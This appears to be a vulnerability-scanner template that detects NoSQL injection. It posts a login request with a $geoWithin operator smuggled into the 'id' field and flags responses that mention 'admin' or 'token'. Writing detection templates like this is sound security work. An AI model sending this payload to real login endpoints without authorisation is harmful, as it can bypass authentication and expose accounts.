id: nosql2-249
name: 'NoSQL $geoWithin in id'
severity: high
type: active
tags:
  - nosql
  - injection
  - api
description: 'NoSQL operator $geoWithin accepted on /api/login'
requests:
  - method: POST
    path: '{{BaseURL}}/api/login'
    body: '{"id":{"$geoWithin":""},"extra":"x"}'
    matchers:
      - type: word
        part: body
        words:
          - 'admin'
          - 'token'
